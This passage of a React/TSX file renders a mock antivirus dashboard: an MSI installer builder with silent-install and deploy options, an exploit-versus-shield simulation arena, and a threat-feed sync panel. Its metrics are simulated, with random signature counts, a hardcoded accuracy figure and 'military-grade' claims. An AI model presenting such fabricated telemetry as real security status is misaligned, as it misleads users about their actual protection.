                              <span className="text-[11.5px] font-semibold text-slate-200 block">IKern-Filter Driver (std_fs_mon.sys)</span>
                              <span className="text-[10px] text-slate-400 block mt-0.5">Intercepts low-level disk I/O to stop instant file encryption.</span>
                            </div>
                          </div>
                          <span className="text-[8.5px] font-mono bg-emerald-500/10 text-emerald-400 px-1 rounded-sm border border-emerald-500/20">RECOMMENDED</span>
                        </div>

                        {/* Driver 2 */}
                        <div className="flex items-center justify-between p-2.5 rounded-xl bg-slate-950/50 border border-slate-850">
                          <div className="flex items-start gap-2.5">
                            <input
                              type="checkbox"
                              checked={msiProcSealEnabled}
                              onChange={(e) => setMsiProcSealEnabled(e.target.checked)}
                              className="mt-1 accent-indigo-600 text-white rounded bg-slate-900 border-slate-800"
                              id="toggle-process-monitor"
                            />
                            <div>
                              <span className="text-[11.5px] font-semibold text-slate-200 block">Process Containment Guard (proc_seal)</span>
                              <span className="text-[10px] text-slate-400 block mt-0.5">Terminates rapid process tree spawns from exploited apps.</span>
                            </div>
                          </div>
                          <span className="text-[8.5px] font-mono bg-emerald-500/10 text-emerald-400 px-1 rounded-sm border border-emerald-500/20">RECOMMENDED</span>
                        </div>

                        {/* Driver 3 */}
                        <div className="flex items-center justify-between p-2.5 rounded-xl bg-slate-950/50 border border-slate-850">
                          <div className="flex items-start gap-2.5">
                            <input
                              type="checkbox"
                              checked={msiRegWatchEnabled}
                              onChange={(e) => setMsiRegWatchEnabled(e.target.checked)}
                              className="mt-1 accent-indigo-600 text-white rounded bg-slate-900 border-slate-800"
                              id="toggle-reg-watch"
                            />
                            <div>
                              <span className="text-[11.5px] font-semibold text-slate-200 block">Hive Watchdog Registry (reg_watcher)</span>
                              <span className="text-[10px] text-slate-400 block mt-0.5">Protects system autoruns, LSASS access keys, and safe-boot keys.</span>
                            </div>
                          </div>
                          <span className="text-[8.5px] font-mono bg-emerald-500/10 text-emerald-400 px-1 rounded-sm border border-emerald-500/20">RECOMMENDED</span>
                        </div>

                        {/* Driver 4 */}
                        <div className="flex items-center justify-between p-2.5 rounded-xl bg-slate-950/50 border border-slate-850">
                          <div className="flex items-start gap-2.5">
                            <input
                              type="checkbox"
                              checked={msiMemScannerEnabled}
                              onChange={(e) => setMsiMemScannerEnabled(e.target.checked)}
                              className="mt-1 accent-indigo-600 text-white rounded bg-slate-900 border-slate-800"
                              id="toggle-mem-scan"
                            />
                            <div>
                              <span className="text-[11.5px] font-semibold text-slate-200 block">Live Memory Sweeper (mem_sweep)</span>
                              <span className="text-[10px] text-slate-400 block mt-0.5">Performs persistent background page inspections (Adds 14MB footprint).</span>
                            </div>
                          </div>
                          <span className="text-[8.5px] font-mono bg-blue-500/10 text-blue-400 px-1 rounded-sm border border-blue-500/20">HEAVYWEIGHT</span>
                        </div>

                        {/* Driver 5 */}
                        <div className="flex items-center justify-between p-2.5 rounded-xl bg-slate-950/50 border border-slate-850 md:col-span-2">
                          <div className="flex items-start gap-2.5">
                            <input
                              type="checkbox"
                              checked={msiNetAgentEnabled}
                              onChange={(e) => setMsiNetAgentEnabled(e.target.checked)}
                              className="mt-1 accent-indigo-600 text-white rounded bg-slate-900 border-slate-800"
                              id="toggle-net-beacon"
                            />
                            <div>
                              <span className="text-[11.5px] font-semibold text-slate-200 block">Beacon Proxy Hook (net_beacon)</span>
                              <span className="text-[10px] text-slate-400 block mt-0.5">Maintains immediate end-to-end encrypted tunnels for back-to-base administrative control over SSL/TLS.</span>
                            </div>
                          </div>
                        </div>

                      </div>
                    </div>

                    {/* 3. MSI Packaging Properties */}
                    <div className="bg-slate-900/40 border border-slate-850 rounded-2xl p-4 space-y-4">
                      <div>
                        <div className="flex items-center gap-2">
                          <HelpCircle className="w-4 h-4 text-purple-400" />
                          <h3 className="text-xs font-semibold uppercase tracking-wider text-slate-200">3. Windows MSI Installer Packaging Parameters</h3>
                        </div>
                        <p className="text-[11px] text-slate-400 mt-0.5">
                          Set the service registration labels and installation directories injected into the WiX compiler templates.
                        </p>
                      </div>

                      <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                        <div>
                          <label className="text-[10.5px] font-mono uppercase text-slate-500 block mb-1.5">Windows Registered Service Name</label>
                          <input
                            type="text"
                            value={msiServiceName}
                            onChange={(e) => setMsiServiceName(e.target.value)}
                            placeholder="SentinelAVShield"
                            className="w-full bg-slate-950 border border-slate-800 rounded-xl py-2 px-3 text-xs text-slate-200 focus:outline-none focus:ring-1 focus:ring-indigo-500"
                            id="input-msi-service-name"
                          />
                        </div>

                        <div>
                          <label className="text-[10.5px] font-mono uppercase text-slate-500 block mb-1.5">System Target Setup Path</label>
                          <input
                            type="text"
                            value={msiInstallPath}
                            onChange={(e) => setMsiInstallPath(e.target.value)}
                            placeholder="C:\Program Files\Sentinel\Antivirus"
                            className="w-full bg-slate-950 border border-slate-800 rounded-xl py-2 px-3 text-xs text-slate-200 focus:outline-none focus:ring-1 focus:ring-indigo-500"
                            id="input-msi-install-path"
                          />
                        </div>

                        <div>
                          <label className="text-[10.5px] font-mono uppercase text-slate-500 block mb-1.5">WiX Cabinet Compression Mode</label>
                          <select
                            value={msiCompressionMode}
                            onChange={(e) => setMsiCompressionMode(e.target.value as "LZMA" | "LZX" | "None")}
                            className="w-full bg-slate-950 border border-slate-800 rounded-xl py-2 px-3 text-xs text-slate-200 focus:outline-none focus:ring-1 focus:ring-indigo-500"
                            id="select-msi-compression"
                          >
                            <option value="LZMA">LZMA - Highest Compression (Best Footprint)</option>
                            <option value="LZX">LZX - Medium Compression (Balanced CPU)</option>
                            <option value="None">None - Standard Raw Directory Dump</option>
                          </select>
                        </div>

                        <div className="flex items-center justify-between p-3 rounded-xl bg-slate-950/40 border border-slate-850">
                          <div>
                            <span className="text-[11px] font-semibold text-slate-200 block">Enforce Silent Installation Mode</span>
                            <span className="text-[9.5px] text-slate-500 block mt-0.5">Configures bootstrapper to hide installer dialogs.</span>
                          </div>
                          <input
                            type="checkbox"
                            checked={msiSilentMode}
                            onChange={(e) => setMsiSilentMode(e.target.checked)}
                            className="accent-indigo-600 rounded bg-slate-900 border-slate-850 focus:ring-offset-0"
                            id="toggle-silent-install"
                          />
                        </div>
                      </div>
                    </div>

                  </div>

                  {/* Right Column (5 cols): Compilation Monitor & Deployment Payload */}
                  <div className="xl:col-span-5 space-y-4 flex flex-col justify-between">
                    
                    {/* Compilation Container */}
                    <div className="bg-slate-950/80 border border-slate-850 rounded-2xl p-4 flex-1 flex flex-col justify-between min-h-[460px]">
                      
                      <div className="space-y-4">
                        <div className="flex items-center justify-between pb-3 border-b border-slate-900">
                          <div>
                            <span className="text-[10px] uppercase font-mono tracking-wider font-semibold text-slate-500 block">Local WiX Engine Simulator</span>
                            <h3 className="text-sm font-semibold text-white tracking-tight mt-0.5">Compilation Output Console</h3>
                          </div>
                          <button
                            onClick={runAvMsiCompilation}
                            disabled={avCompiling}
                            className={`py-2 px-4 rounded-xl text-xs font-semibold tracking-wide transition flex items-center gap-2 border ${
                              avCompiling
                                ? "bg-indigo-600/20 text-indigo-400 border-indigo-500/20 cursor-not-allowed"
                                : "bg-indigo-600 hover:bg-indigo-500 text-white border-indigo-500 shadow-md shadow-indigo-950/30"
                            }`}
                            id="compile-msi-btn"
                          >
                            <Play className={`w-3.5 h-3.5 ${avCompiling ? "animate-spin text-indigo-400" : ""}`} />
                            <span>{avCompiling ? "Compiling Client..." : "Compile Standalone MSI"}</span>
                          </button>
                        </div>

                        {/* Progress Bar */}
                        {avCompiling && (
                          <div className="space-y-1.5" id="compilation-progress-bar">
                            <div className="flex justify-between text-[10px] font-mono text-slate-400">
                              <span>Generating Assemblies...</span>
                              <span className="text-indigo-400 font-bold">{avCompileProgress}%</span>
                            </div>
                            <div className="w-full bg-slate-900 h-2 rounded-full overflow-hidden border border-slate-850">
                              <div 
                                className="bg-indigo-600 h-full transition-all duration-300 ease-out"
                                style={{ width: `${avCompileProgress}%` }}
                              ></div>
                            </div>
                          </div>
                        )}

                        {/* CLI Compiler Console */}
                        <div className="border border-slate-850/65 bg-slate-950 p-3.5 rounded-xl font-mono text-[11px] leading-relaxed space-y-2.5 h-[190px] overflow-y-auto" id="compiler-log-window">
                          <div className="flex justify-between text-slate-500 text-[10px] pb-1.5 border-b border-slate-900/80">
                            <span>WIX COMPILER CLI OUTPUT</span>
                            <span>STATUS: {avCompiling ? "BUSY" : "READY"}</span>
                          </div>
                          {avCompileLogs.length === 0 ? (
                            <div className="text-slate-500 italic text-center pt-8">
                              Pending compilation trigger.<br />
                              Configure options on the left and click &quot;Compile Standalone MSI&quot; to start.
                            </div>
                          ) : (
                            <div className="space-y-1.5 text-slate-300 whitespace-pre-wrap font-mono text-[10.5px]">
                              {avCompileLogs.map((logLine, idx) => (
                                <div key={idx} className={logLine.startsWith("[COMPILER] BUILD SUCCESSFUL") ? "text-emerald-400 font-semibold" : logLine.includes("ACTIVE") ? "text-indigo-300" : "text-slate-300"}>
                                  {logLine}
                                </div>
                              ))}
                            </div>
                          )}
                        </div>
                      </div>

                      {/* Compiled Artifact Download Display */}
                      {avCompiledArtifact && (
                        <div className="mt-4 p-3.5 bg-emerald-950/25 border border-emerald-500/25 rounded-2xl space-y-3.5 animate-fadeIn" id="compiled-success-artifact">
                          <div className="flex items-start gap-2.5">
                            <div className="p-1.5 bg-emerald-500/10 rounded-lg border border-emerald-500/20 text-emerald-400">
                              <CheckCircle2 className="w-4 h-4" />
                            </div>
                            <div className="flex-1">
                              <span className="text-[10px] font-mono text-emerald-400 font-bold uppercase block tracking-wider">Installer Generated Successfully</span>
                              <h4 className="text-xs font-semibold text-slate-200 mt-0.5">{avCompiledArtifact.fileName}</h4>
                            </div>
                            <span className="text-[11px] font-mono font-bold text-slate-300 bg-emerald-950/50 border border-emerald-500/10 px-2 py-0.5 rounded">
                              {avCompiledArtifact.footprintSize}
                            </span>
                          </div>

                          <div className="space-y-1.5 text-[10px] font-mono text-slate-400 border-t border-slate-900 pt-3">
                            <div className="flex justify-between">
                              <span>Cabinet Compression:</span>
                              <span className="text-slate-300 font-bold">{avCompiledArtifact.compressionRatio}</span>
                            </div>
                            <div className="flex flex-col gap-0.5">
                              <span>Authenticode Authenticity Fingerprint:</span>
                              <span className="text-slate-300 select-all font-semibold break-all bg-slate-900 border border-slate-850 p-1 rounded-md text-[9.5px]">
                                {avCompiledArtifact.sha256}
                              </span>
                            </div>
                            <div className="flex flex-col gap-0.5 pt-1.5">
                              <span>Admins Shell CMD Deploy Command:</span>
                              <span className="text-emerald-400 select-all font-semibold break-all bg-slate-900 border border-slate-850 p-1.5 rounded-md text-[9.5px]">
                                msiexec /i {avCompiledArtifact.fileName} {msiSilentMode ? "/qn /norestart" : ""} SERVICE_KEY=SNTL-{(msiServiceName.length * 99)}-SEC
                              </span>
                            </div>
                          </div>

                          <button
                            onClick={() => {
                              alert(`Simulating file download request:\nInstalling standalone package "${avCompiledArtifact.fileName}" with a minimal file setup footprint of ${avCompiledArtifact.footprintSize}.\n\nTo install, run the prompt deployment command in your Windows System target environment.`);
                              
                              // Log audit action
                              logAuditAction(
                                "AV_MSI_DOWNLOADED",
                                `Downloaded standalone Windows installation bootstrapper "${avCompiledArtifact.fileName}" (${avCompiledArtifact.footprintSize}).`,
                                "Success"
                              );
                            }}
                            className="w-full bg-emerald-600 hover:bg-emerald-500 text-white font-semibold text-xs py-2 px-3 rounded-lg transition duration-200 border border-emerald-500 flex items-center justify-center gap-1.5"
                            id="download-generated-msi-btn"
                          >
                            <Check className="w-3.5 h-3.5" />
                            <span>Download Bootstrapper MSI</span>
                          </button>
                        </div>
                      )}

                    </div>

                    {/* Operational Guidelines block */}
                    <div className="bg-slate-900/40 border border-slate-850 rounded-2xl p-4 text-xs space-y-2 font-sans text-slate-400 leading-relaxed">
                      <span className="text-[10px] uppercase font-mono tracking-wider font-bold text-slate-300 block mb-1">🛠️ Enterprise deployment recommendations:</span>
                      <p>
                        By selecting the <strong className="text-slate-200">Micro-Signature Set</strong> in conjunction with <strong className="text-slate-200">LZMA cabinet compression</strong>, the client payload delivers a minimal install footprint of only <strong>1.4 MB</strong> on disk                        Deploy the MSI quietly through Active Directory GPO or SCCM software distribution networks using standard MSIDistributor arguments.
                      </p>
                    </div>

                  </div>

                </div>
              </div>
            )}

            {/* TAB 8: SENTINELAI HUB MASTER & CYBER ARENA */}
            {activeTab === "hubmaster" && (
              <div className="flex-1 flex flex-col pt-1" id="view-hubmaster">
                <div className="flex items-center justify-between pb-4 border-b border-slate-850">
                  <div>
                    <h2 className="text-base font-semibold text-white tracking-tight flex items-center gap-2">
                      <Sparkles className="w-4 h-4 text-yellow-400 animate-spin" style={{ animationDuration: "3s" }} />
                      SentinelAI Hub Master: Cryptographic Offensive & Defensive Cyber Arena
                    </h2>
                    <p className="text-xs text-slate-400 mt-1">
                      Simulate advanced threat execution models and deploy state-of-the-art military-grade cryptographic shield arrays matching the standards in <code className="text-indigo-400 font-mono">C:\GitHub\SentinelAI_Hub_Master</code>.
                    </p>
                  </div>
                  <span className="text-[10px] font-mono bg-yellow-500/10 text-yellow-400 border border-yellow-500/30 py-1 px-2.5 rounded animate-pulse">
                    ENCRYPTION STANDARD: LATTICE-COMPLIANT
                  </span>
                </div>

                <div className="grid grid-cols-1 lg:grid-cols-12 gap-6 mt-6">
                  
                  {/* Left Column: 10x Offensive Vector Controls (4 cols) */}
                  <div className="lg:col-span-4 space-y-4">
                    <div className="flex items-center gap-2 pb-1">
                      <Terminal className="w-4 h-4 text-red-500" />
                      <h3 className="text-xs font-bold uppercase tracking-widest text-slate-400">10x Offensive Threat Models</h3>
                    </div>

                    <div className="space-y-2.5 max-h-[580px] overflow-y-auto pr-2 custom-scrollbar">
                      {INITIAL_HUB_OFFENSES.map((offense) => {
                        const shieldKey = offense.expectedDefeatedBy;
                        const isShieldActive = hubDefensesActive[shieldKey];

                        return (
                          <div
                            key={offense.id}
                            onClick={() => {
                              if (!hubOffenseRunning && !hubDefenseRunning) {
                                setSelectedHubOffenseId(offense.id);
                              }
                            }}
                            className={`p-3 text-left rounded-xl border transition-all duration-200 cursor-pointer relative overflow-hidden ${
                              selectedHubOffenseId === offense.id
                                ? "bg-red-950/15 border-red-500/60 shadow-md shadow-red-950/20"
                                : "bg-slate-900/45 border-slate-800/80 hover:border-slate-750 hover:bg-slate-900/60"
                            }`}
                            id={`hub-offense-card-${offense.id}`}
                          >
                            {/* Color Accent Indicator Strip */}
                            <div className={`absolute left-0 top-0 bottom-0 w-[3px] ${
                              offense.severity === "Critical" ? "bg-red-600" :
                              offense.severity === "High" ? "bg-amber-600" : "bg-yellow-500"
                            }`}></div>

                            <div className="pl-1.5 space-y-1">
                              <div className="flex items-start justify-between gap-1.5">
                                <span className="font-semibold text-slate-100 text-[12px] block leading-tight">{offense.name}</span>
                                <span className={`text-[8.5px] font-mono uppercase tracking-wider py-0.5 px-1.5 rounded-sm shrink-0 border ${
                                  offense.severity === "Critical" ? "bg-red-500/10 text-red-400 border-red-500/20 animate-pulse" :
                                  offense.severity === "High" ? "bg-amber-500/10 text-amber-400 border-amber-500/20" :
                                  "bg-yellow-500/10 text-yellow-400 border-yellow-500/20"
                                }`}>
                                  {offense.severity}
                                </span>
                              </div>

                              <div className="flex items-center gap-1.5 pt-0.5">
                                <span className="text-[9.5px] font-mono text-slate-500">{offense.cve}</span>
                                <span className="text-slate-700">•</span>
                                <span className="text-[9.5px] text-indigo-400 truncate max-w-[150px] font-mono">{offense.subsystem}</span>
                              </div>

                              {/* Associated Shield Status Indicators */}
                              <div className="flex items-center justify-between pt-2 border-t border-slate-950 mt-2">
                                <span className="text-[9px] font-mono text-slate-550 uppercase">Rogue Payload Shield:</span>
                                <span className={`text-[9.5px] font-mono font-bold inline-flex items-center gap-1 ${
                                  isShieldActive ? "text-emerald-400" : "text-amber-500"
                                }`}>
                                  <span className={`w-1 h-1 rounded-full ${isShieldActive ? "bg-emerald-400" : "bg-amber-500"}`}></span>
                                  {isShieldActive ? "ARMED" : "DORMANT"}
                                </span>
                              </div>
                            </div>
                          </div>
                        );
                      })}
                    </div>
                  </div>

                  {/* Center Column: Interactive Sandbox Terminal & Attack Controller (4 cols) */}
                  <div className="lg:col-span-4 flex flex-col justify-between space-y-5">
                    
                    {/* Shell Action Terminal Controller */}
                    <div className="bg-slate-900/35 border border-slate-850 rounded-2xl p-4 flex-1 flex flex-col justify-between min-h-[420px]">
                      
                      {(() => {
                        const selectedOffense = INITIAL_HUB_OFFENSES.find(o => o.id === selectedHubOffenseId) || INITIAL_HUB_OFFENSES[0];
                        const expectedMitigationId = selectedOffense.expectedDefeatedBy;
                        const defenseActive = hubDefensesActive[expectedMitigationId];
                        const mitigationObj = INITIAL_HUB_DEFENSES.find(d => d.id === expectedMitigationId);
                        
                        return (
                          <div className="flex flex-col h-full justify-between gap-4">
                            <div className="space-y-4">
                              <div className="border-b border-slate-900 pb-3">
                                <span className="text-[9px] uppercase font-mono tracking-wider font-semibold text-slate-550 block">SIMULATION SECTOR HUB</span>
                                <h3 className="text-xs font-bold text-white tracking-tight mt-0.5">{selectedOffense.name}</h3>
                                <p className="text-[11px] text-slate-400 mt-1">{selectedOffense.description}</p>
                              </div>

                              <div className="space-y-2 text-xs">
                                <div className="p-2.5 rounded-xl bg-slate-950/70 border border-slate-900 leading-normal">
                                  <span className="text-[9.5px] font-mono text-slate-500 uppercase block">Exploit Command Context</span>
                                  <code className="text-red-400 block font-mono text-[10.5px] mt-1 break-all bg-red-950/10 p-1.5 rounded border border-red-500/10">
                                    {selectedOffense.exploitCommand}
                                  </code>
                                </div>

                                <div className="p-2.5 rounded-xl bg-slate-950/70 border border-slate-900 leading-normal">
                                  <span className="text-[9.5px] font-mono text-slate-500 uppercase block">Underlying System Vulnerability</span>
                                  <p className="text-[11px] text-slate-450 mt-1 font-sans font-medium">{selectedOffense.attackVector}</p>
                                </div>

                                <div className="p-2.5 rounded-xl bg-slate-950/70 border border-slate-900 flex items-center justify-between">
                                  <div>
                                    <span className="text-[9.5px] font-mono text-slate-500 uppercase block">Defeated By Secure Shield</span>
                                    <span className="text-[11.5px] font-semibold text-slate-200 mt-0.5 block">{mitigationObj?.name}</span>
                                  </div>
                                  <span className={`text-[9.5px] font-mono uppercase tracking-wider py-1 px-1.5 rounded font-bold ${
                                    defenseActive 
                                      ? "bg-emerald-500/10 text-emerald-400 border border-emerald-500/20" 
                                      : "bg-amber-500/10 text-amber-400 border border-amber-500/20"
                                  }`}>
                                    {defenseActive ? "ARMED" : "DORMANT"}
                                  </span>
                                </div>
                              </div>
                            </div>

                            <div className="space-y-3 pt-3 border-t border-slate-900">
                              {/* Progress status indicators */}
                              {(hubOffenseRunning || hubDefenseRunning) && (
                                <div className="space-y-1.5">
                                  <div className="flex justify-between text-[10px] font-mono text-slate-450">
                                    <span>{hubOffenseRunning ? "Injecting Attack Code..." : "Calibrating Shield Elements..."}</span>
                                    <span>{hubActionProgress}%</span>
                                  </div>
                                  <div className="w-full bg-slate-950 h-1.5 rounded-full overflow-hidden border border-slate-900/60">
                                    <div 
                                      className={`h-full transition-all duration-300 ease-out ${hubOffenseRunning ? "bg-red-500" : "bg-indigo-500"}`}
                                      style={{ width: `${hubActionProgress}%` }}
                                    ></div>
                                  </div>
                                </div>
                              )}

                              <div className="flex gap-2">
                                <button
                                  onClick={executeHubExploitSimulation}
                                  disabled={hubOffenseRunning || hubDefenseRunning}
                                  className={`flex-1 py-2 rounded-xl text-xs font-semibold tracking-wide transition flex items-center justify-center gap-1.5 border ${
                                    hubOffenseRunning || hubDefenseRunning
                                      ? "bg-slate-900 text-slate-550 border-slate-850 cursor-not-allowed"
                                      : "bg-red-650 hover:bg-red-550 text-white border-red-500 shadow-md shadow-red-950/20"
                                  }`}
                                  id="trigger-exploit-sim-btn"
                                >
                                  <Play className="w-3.5 h-3.5" />
                                  <span>Simulate Exploit Attack</span>
                                </button>
                              </div>
                            </div>

                          </div>
                        );
                      })()}

                    </div>

                    {/* Threat Console Sandbox Output Log Terminal */}
                    <div className="bg-slate-950/90 border border-slate-850 rounded-2xl p-4 flex flex-col gap-3">
                      <div className="flex items-center justify-between pb-2 border-b border-slate-900">
                        <div className="flex items-center gap-2">
                          <Terminal className="w-3.5 h-3.5 text-indigo-400 animate-pulse" />
                          <span className="text-[10px] font-mono font-bold tracking-wider text-slate-400 uppercase">Interactive Terminal Output CLI</span>
                        </div>
                        <span className="text-[8.5px] font-mono text-indigo-400">Hub-Master Core v2.4</span>
                      </div>

                      <div className="font-mono text-[10px] text-slate-350 leading-relaxed bg-black/50 p-3 rounded-xl border border-slate-950 h-[190px] overflow-y-auto" id="hub-sandbox-output-logs">
                        {hubTerminalLogs.length === 0 ? (
                          <div className="text-slate-500 italic text-center pt-14">
                            Logs terminal standby... <br />
                            Select configurations to run simulation commands.
                          </div>
                        ) : (
                          <div className="space-y-1.5 font-mono text-[10px] leading-relaxed break-words whitespace-pre-wrap">
                            {hubTerminalLogs.map((logLine, idx) => {
                              const isHeader = logLine.startsWith("[ARENA-") || logLine.includes("==================");
                              let cls = "text-slate-300";
                              if (isHeader) {
                                cls = "text-slate-500 font-medium";
                              } else if (logLine.includes("[!]")) {
                                cls = "text-yellow-500";
                              } else if (logLine.includes("[+]")) {
                                cls = "text-emerald-400 font-semibold";
                              } else if (logLine.includes("[-]")) {
                                cls = "text-rose-400";
                              } else if (logLine.includes("WARNING:") || logLine.includes("compromise complete")) {
                                cls = "text-rose-500 font-bold animate-pulse";
                              } else if (logLine.includes("SECURITY EVENT BLOCK")) {
                                cls = "text-emerald-400 font-bold animate-pulse";
                              }
                              return (
                                <div key={idx} className={cls}>
                                  {logLine}
                                </div>
                              );
                            })}
                          </div>
                        )}
                      </div>
                    </div>

                  </div>

                  {/* Right Column: 10x Cryptographic Defensive Safeguards (4 cols) */}
                  <div className="lg:col-span-4 space-y-4">
                    <div className="flex items-center gap-2 pb-1">
                      <ShieldCheck className="w-4 h-4 text-emerald-400" />
                      <h3 className="text-xs font-bold uppercase tracking-widest text-slate-400">10x Cryptographic Shield Layers</h3>
                    </div>

                    <div className="space-y-2.5 max-h-[580px] overflow-y-auto pr-2 custom-scrollbar">
                      {INITIAL_HUB_DEFENSES.map((defense) => {
                        const isArmed = hubDefensesActive[defense.id];

                        return (
                          <div
                            key={defense.id}
                            onClick={() => {
                              if (!hubOffenseRunning && !hubDefenseRunning) {
                                setSelectedHubDefenseId(defense.id);
                              }
                            }}
                            className={`p-3 text-left rounded-xl border transition-all duration-200 cursor-pointer relative overflow-hidden ${
                              selectedHubDefenseId === defense.id
                                ? "bg-indigo-950/15 border-indigo-500/60 shadow-md shadow-indigo-950/20"
                                : "bg-slate-900/45 border-slate-800/80 hover:border-slate-750 hover:bg-slate-900/60"
                            }`}
                            id={`hub-defense-card-${defense.id}`}
                          >
                            {/* Color Accent Indicator Strip */}
                            <div className={`absolute left-0 top-0 bottom-0 w-[3px] ${
                              isArmed ? "bg-emerald-400" : "bg-slate-700"
                            }`}></div>

                            <div className="pl-1.5 space-y-1">
                              <div className="flex items-start justify-between gap-1.5">
                                <span className="font-semibold text-slate-100 text-[12px] block leading-tight">{defense.name}</span>
                                <span className={`text-[8px] font-mono uppercase tracking-wider py-0.5 px-1.5 rounded-sm shrink-0 border ${
                                  isArmed 
                                    ? "bg-emerald-500/10 text-emerald-400 border-emerald-500/20 font-bold" 
                                    : "bg-slate-800/60 text-slate-450 border-slate-800"
                                }`}>
                                  {isArmed ? "ARMED" : "DORMANT"}
                                </span>
                              </div>

                              <div className="flex items-center gap-1.5 pt-0.5">
                                <span className="text-[9.5px] font-mono text-slate-400">{defense.algorithm}</span>
                              </div>

                              <p className="text-[10.5px] text-slate-400 leading-snug line-clamp-1">{defense.description}</p>

                              {/* Toggle Switch */}
                              <div className="flex items-center justify-between pt-2 border-t border-slate-950 mt-2">
                                <span className="text-[9px] font-mono text-slate-550 uppercase">Operational Audit State</span>
                                <button
                                  onClick={(e) => {
                                    e.stopPropagation();
                                    executeHubDefenseSimulation(defense.id);
                                  }}
                                  disabled={hubOffenseRunning || hubDefenseRunning}
                                  className={`py-0.5 px-2 rounded font-mono text-[9.5px] font-semibold transition ${
                                    isArmed
                                      ? "bg-red-500/10 text-red-400 border border-red-500/20 hover:bg-red-500/20"
                                      : "bg-emerald-500/10 text-emerald-400 border border-emerald-500/20 hover:bg-emerald-500/20"
                                  }`}
                                  id={`hub-defense-toggle-btn-${defense.id}`}
                                >
                                  {isArmed ? "Deactivate Shield" : "Activate Shield"}
                                </button>
                              </div>
                            </div>
                          </div>
                        );
                      })}
                    </div>
                  </div>

                </div>
              </div>
            )}

            {/* TAB 9: AUTONOMOUS THREAT INTELLIGENCE & ADAPTIVE LEARNING */}
            {activeTab === "threatintelligence" && (
              <div className="flex-1 flex flex-col pt-1 animate-fade-in" id="view-threatintelligence">
                <div className="flex flex-col md:flex-row md:items-center justify-between pb-4 border-b border-slate-850 gap-y-3">
                  <div>
                    <h2 className="text-base font-semibold text-white tracking-tight flex items-center gap-2">
                      <Database className="w-4 h-4 text-cyan-400 animate-pulse" />
                      Autonomous Threat Intelligence Hub & Real-Time Sync Engine (10x Databases)
                    </h2>
                    <p className="text-xs text-slate-400 mt-1">
                      Continuous decentralized ingest from global threat feeds. System autonomously parses, compiles signatures, and coordinates hot-patches.
                    </p>
                  </div>
                  
                  <div className="flex items-center gap-3">
                    <div className="flex items-center gap-2 bg-slate-900 py-1.5 px-3 rounded-lg border border-slate-800">
                      <span className="relative flex h-2 w-2">
                        <span className={`animate-ping absolute inline-flex h-full w-full rounded-full opacity-75 ${autoUpdateEnabled ? "bg-cyan-400" : "bg-slate-500"}`}></span>
                        <span className={`relative inline-flex rounded-full h-2 w-2 ${autoUpdateEnabled ? "bg-cyan-500" : "bg-slate-600"}`}></span>
                      </span>
                      <span className="text-[11px] font-mono font-medium text-slate-300">Autonomous Protect:</span>
                      <button
                        onClick={() => {
                          const nextState = !autoUpdateEnabled;
                          setAutoUpdateEnabled(nextState);
                          logAuditAction("AUTONOMOUS_MODE_TOGGLED", `User toggled Autonomous Intelligence Threat Adaptation system to: ${nextState ? "ENABLED" : "DISABLED"}`, nextState ? "Success" : "Warning");
                          setAdaptiveIntelligenceLogs(prev => [
                            `[CORE] [${new Date().toTimeString().split(" ")[0]}] Autonomous Threat Adaptation mode turned ${nextState ? "ON (Continuous protection enabled)" : "OFF (Standby mode active)"}.`,
                            ...prev
                          ]);
                        }}
                        className={`text-[10px] font-mono py-0.5 px-2 rounded font-bold transition ${
                          autoUpdateEnabled
                            ? "bg-cyan-500/20 text-cyan-400 border border-cyan-500/30 hover:bg-cyan-500/30"
                            : "bg-slate-850 text-slate-500 border border-slate-850 hover:text-slate-300"
                        }`}
                        id="toggle-autonomous-adaptation-btn"
                      >
                        {autoUpdateEnabled ? "ACTIVE" : "STANDBY"}
                      </button>
                    </div>

                    <button
                      onClick={() => {
                        // Force manual sync on all databases
                        setActiveSyncingDbId("all");
                        setAdaptiveIntelligenceLogs(prev => [
                          `[DB-SYNC] [${new Date().toTimeString().split(" ")[0]}] User initialized manual signature synchronize sweep...`,
                          ...prev
                        ]);
                        
                        setTimeout(() => {
                          setThreatDbs(prevDbs => prevDbs.map(db => ({
                            ...db,
                            status: "Synchronized",
                            signaturesCount: db.signaturesCount + Math.floor(Math.random() * 2000) + 120,
                            lastUpdated: "Just Now"
                          })));
                          setActiveSyncingDbId(null);
                          setAdaptiveIntelligenceLogs(prev => [
                            `[DB-SYNC] [${new Date().toTimeString().split(" ")[0]}] Manual synchronization complete! Refreshed 10 threat vectors.`,
                            `[ADAPTATION] [${new Date().toTimeString().split(" ")[0]}] Dynamic hash boundaries updated successfully.`,
                            ...prev
                          ]);
                          logAuditAction("MANUAL_SYNC", "Triggered high-volume network-wide threat signature database sync", "Success");
                        }, 1800);
                      }}
                      disabled={activeSyncingDbId !== null}
                      className={`text-[10px] font-mono py-1.5 px-3 rounded-lg border transition flex items-center gap-1.5 leading-none ${
                        activeSyncingDbId !== null
                          ? "bg-slate-900 border-slate-850 text-slate-650 cursor-not-allowed"
                          : "bg-indigo-600/15 hover:bg-indigo-600/30 text-indigo-400 border-indigo-500/30 font-semibold"
                      }`}
                      id="manual-threat-sync-btn"
                    >
                      <RefreshCw className={`w-3 h-3 ${activeSyncingDbId !== null ? "animate-spin" : ""}`} />
                      <span>Sync All DBs Now</span>
                    </button>
                  </div>
                </div>

                {/* Dashboard Metrics Cards */}
                <div className="grid grid-cols-2 lg:grid-cols-4 gap-4 mt-5">
                  <div className="bg-slate-900/30 border border-slate-850/80 rounded-xl p-3">
                    <span className="text-[10px] font-mono text-slate-500 uppercase block tracking-wider">Monitored Feeds</span>
                    <span className="text-lg font-bold text-slate-100 font-mono mt-0.5 block flex items-center gap-1.5">
                      10 / 10
                      <span className="text-[9.5px] text-emerald-400 px-1 bg-emerald-500/10 border border-emerald-500/20 rounded font-normal uppercase font-mono">
                        Active
                      </span>
                    </span>
                  </div>
                  <div className="bg-slate-900/30 border border-slate-850/80 rounded-xl p-3">
                    <span className="text-[10px] font-mono text-slate-500 uppercase block tracking-wider">Aggregated Hashes</span>
                    <span className="text-lg font-bold text-cyan-400 font-mono mt-0.5 block animate-pulse">
                      {threatDbs.reduce((acc, db) => acc + db.signaturesCount, 0).toLocaleString()}
                    </span>
                  </div>
                  <div className="bg-slate-900/30 border border-slate-850/80 rounded-xl p-3">
                    <span className="text-[10px] font-mono text-slate-500 uppercase block tracking-wider">Avg Signal Accuracy</span>
                    <span className="text-lg font-bold text-slate-100 font-mono mt-0.5 block">
                      99.89%
                    </span>
                  </div>
                  <div className="bg-slate-900/30 border border-slate-850/80 rounded-xl p-3">
